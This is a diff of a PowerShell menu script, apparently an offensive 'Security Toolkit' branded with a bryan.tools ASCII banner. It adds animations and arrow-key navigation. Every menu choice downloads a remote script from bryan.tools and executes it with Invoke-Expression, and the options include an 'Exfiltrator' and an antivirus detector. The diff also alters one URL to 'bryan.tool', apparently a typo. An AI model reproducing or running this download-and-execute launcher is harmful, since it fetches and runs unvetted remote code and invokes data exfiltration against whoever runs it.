@@ -1,61 +1,142 @@
 # Define the tool URLs in a hashtable for better management
 $tools = @{
-    "What is my IP?" = "http://bryan.tools/Whatismtip"
+    "What is my IP?" = "http://bryan.tool/Whatismtip"
     "Am I admin?"    = "http://bryan.tools/amiadmin"
     "AV Detect"      = "http://bryan.tools/detect"
     "Exfiltrator"    = "http://bryan.tools/exfil"
     "Reporter"       = "http://bryan.tools/report"
 }
 
-function Show-Menu {
-    Clear-Host
-    Write-Host "Security Toolkit v1.0`n" -ForegroundColor Cyan
-    Write-Host "Select a tool to run:`n" -ForegroundColor Yellow
-
-    $menuIndex = 1
-    $tools.Keys | ForEach-Object {
-        Write-Host "[$menuIndex] $_" -ForegroundColor Green
-        $menuIndex++
+function Show-LoadingAnimation {
+    $frames = '|', '/', '-', '\'
+    foreach ($frame in $frames * 2) {
+        Write-Host "`rLoading $frame" -NoNewline -ForegroundColor Cyan
+        Start-Sleep -Milliseconds 100
     }
-    Write-Host "`n[0] Exit`n" -ForegroundColor Red
+    Write-Host "`r           " -NoNewline
+}
+
+function Show-Banner {
+    $banner = @"
+$$$$$$$\  $$$$$$$\ $$\     $$\  $$$$$$\  $$\   $$\       $$$$$$$\   $$$$$$\ $$$$$$$$\       $$$$$$$$\  $$$$$$\   $$$$$$\  $$\       $$$$$$\  
+$$  __$$\ $$  __$$\\$$\   $$  |$$  __$$\ $$$\  $$ |      $$  __$$\ $$  __$$\\__$$  __|      \__$$  __|$$  __$$\ $$  __$$\ $$ |     $$  __$$\ 
+$$ |  $$ |$$ |  $$ |\$$\ $$  / $$ /  $$ |$$$$\ $$ |      $$ |  $$ |$$ /  $$ |  $$ |            $$ |   $$ /  $$ |$$ /  $$ |$$ |     $$ /  \__|
+$$$$$$$\ |$$$$$$$  | \$$$$  /  $$$$$$$$ |$$ $$\$$ |      $$ |  $$ |$$ |  $$ |  $$ |            $$ |   $$ |  $$ |$$ |  $$ |$$ |     \$$$$$$\  
+$$  __$$\ $$  __$$<   \$$  /   $$  __$$ |$$ \$$$$ |      $$ |  $$ |$$ |  $$ |  $$ |            $$ |   $$ |  $$ |$$ |  $$ |$$ |      \____$$\ 
+$$ |  $$ |$$ |  $$ |   $$ |    $$ |  $$ |$$ |\$$$ |      $$ |  $$ |$$ |  $$ |  $$ |            $$ |   $$ |  $$ |$$ |  $$ |$$ |     $$\   $$ |
+$$$$$$$  |$$ |  $$ |   $$ |    $$ |  $$ |$$ | \$$ |      $$$$$$$  | $$$$$$  |  $$ |            $$ |    $$$$$$  | $$$$$$  |$$$$$$$$\\$$$$$$  |
+\_______/ \__|  \__|   \__|    \__|  \__|\__|  \__|      \_______/  \______/   \__|            \__|    \______/  \______/ \________|\______/ 
+==============================================================
+                    Security Toolkit v1.0
+==============================================================
+"@
+    $colors = @('Cyan', 'Yellow', 'Green')
+    $lines = $banner -split "`n"
+    for ($i = 0; $i -lt $lines.Count; $i++) {
+        $color = $colors[$i % $colors.Count]
+        Write-Host $lines[$i] -ForegroundColor $color
+    }
+}
+
+function Show-Menu {
+    param(
+        [int]$SelectedIndex = 0
+    )
+    Clear-Host
+    Show-Banner
+    Write-Host "`nSelect a tool to run:" -ForegroundColor Yellow
+    Write-Host "Use arrow keys ↑↓ to navigate, Enter to select`n" -ForegroundColor Gray
+
+    for ($i = 0; $i -lt $tools.Count; $i++) {
+        $tool = $tools.Keys | Select-Object -Index $i
+        if ($i -eq $SelectedIndex) {
+            Write-Host " → " -NoNewline -ForegroundColor Cyan
+            Write-Host "[$($i + 1)] $tool" -ForegroundColor White -BackgroundColor DarkBlue
+        } else {
+            Write-Host "   [$($i + 1)] $tool" -ForegroundColor Green
+        }
+    }
+
+    Write-Host "`n   [0] Exit" -ForegroundColor Red
+}
+
+function Show-ExecutionAnimation {
+    param(
+        [string]$ToolName
+    )
+    $frames = '⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'
+    $colors = @('Cyan', 'Yellow', 'Green', 'Magenta')
+    $i = 0
+    foreach ($frame in $frames * 3) {
+        $color = $colors[$i % $colors.Count]
+        Write-Host "`rExecuting $ToolName $frame" -NoNewline -ForegroundColor $color
+        Start-Sleep -Milliseconds 100
+        $i++
+    }
+    Write-Host "`r                                 " -NoNewline
 }
 
 function Invoke-SelectedTool {
     param (
-        [string]$Url
+        [string]$Url,
+        [string]$ToolName
     )
+    Write-Host "`n"
+    Show-ExecutionAnimation -ToolName $ToolName
     try {
-        Write-Host "`nExecuting script from $Url..." -ForegroundColor Yellow
+        Write-Host "`nConnecting to $ToolName..." -ForegroundColor Yellow
         $result = Invoke-RestMethod -Uri $Url -UseBasicParsing
         if ($result) {
+            Write-Host "Executing script..." -ForegroundColor Green
             Invoke-Expression $result
         }
     }
     catch {
-        Write-Host "Error executing script: $_" -ForegroundColor Red
+        Write-Host "`nError executing script: $_" -ForegroundColor Red
     }
-    Write-Host "`nPress any key to continue..."
+    Write-Host "`nPress any key to return to menu..." -ForegroundColor Yellow
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 }
 
-# Main menu loop
+# Main menu loop with loading animation
+Clear-Host
+Show-LoadingAnimation
+
+$selectedIndex = 0
 while ($true) {
-    Show-Menu
-    $choice = Read-Host "Enter your choice"
+    Show-Menu -SelectedIndex $selectedIndex
     
-    if ($choice -eq '0') {
-        Write-Host "Goodbye!" -ForegroundColor Cyan
-        break
-    }
+    $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
     
-    $toolIndex = [int]$choice - 1
-    if ($toolIndex -ge 0 -and $toolIndex -lt $tools.Count) {
-        $selectedTool = ($tools.Keys | Select-Object -Index $toolIndex)
-        $selectedUrl = $tools[$selectedTool]
-        Invoke-SelectedTool -Url $selectedUrl
-    }
-    else {
-        Write-Host "Invalid selection. Press any key to continue..."
-        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+    switch ($key.VirtualKeyCode) {
+        38 { # Up arrow
+            if ($selectedIndex -gt 0) { $selectedIndex-- }
+        }
+        40 { # Down arrow
+            if ($selectedIndex -lt ($tools.Count - 1)) { $selectedIndex++ }
+        }
+        13 { # Enter
+            $selectedTool = $tools.Keys | Select-Object -Index $selectedIndex
+            $selectedUrl = $tools[$selectedTool]
+            Invoke-SelectedTool -Url $selectedUrl -ToolName $selectedTool
+        }
+        48 { # 0 key
+            Clear-Host
+            Write-Host "`nGoodbye!" -ForegroundColor Cyan
+            Start-Sleep -Seconds 1
+            return
+        }
+        Default {
+            # Handle number keys 1-5
+            $keyChar = [char]$key.Character
+            if ($keyChar -ge '1' -and $keyChar -le '5') {
+                $index = [int]::Parse($keyChar) - 1
+                if ($index -lt $tools.Count) {
+                    $selectedTool = $tools.Keys | Select-Object -Index $index
+                    $selectedUrl = $tools[$selectedTool]
+                    Invoke-SelectedTool -Url $selectedUrl -ToolName $selectedTool
+                }
+            }
+        }
     }
 }
